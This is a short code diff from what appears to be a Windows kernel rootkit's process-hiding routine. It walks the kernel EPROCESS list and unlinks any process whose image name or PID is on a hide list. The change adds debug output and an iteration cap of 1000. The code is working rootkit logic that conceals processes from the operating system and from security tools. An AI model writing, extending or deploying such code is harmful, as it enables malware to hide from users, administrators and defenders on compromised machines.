@@ -121,21 +121,32 @@ namespace hide_proc
 		eprocess::ProcInfo cur_proc(SYSTEM_PROCESS_ID);
 		eprocess::ProcInfo next_proc;
 
+		int cnt = 0;
+
 		while (true)
 		{
 			// Hide process
-			next_proc = cur_proc.GetNextProc();
+			next_proc = eprocess::ProcInfo(cur_proc.GetNextProc());
+
 			String<WCHAR> process_image_name = cur_proc.GetProcessImageName();
 			if (GetIndexInHiddenProcImageList(&process_image_name) != -1 || GetIndexInHiddenProcIdList(cur_proc.GetPid()) != -1)
 			{
+				DebugMessage("Found PID to hide: %lld", cur_proc.GetPid());
 				cur_proc.DetachFromProcessList();
 			}
 
 			if (next_proc.GetPid() == SYSTEM_PROCESS_ID)
 			{
+				DebugMessage("GGEZ");
 				break;
 			}
 			cur_proc = next_proc;
+
+			cnt++;
+			if (cnt == 1000)
+			{
+				break;
+			}
 		}
 	}
 
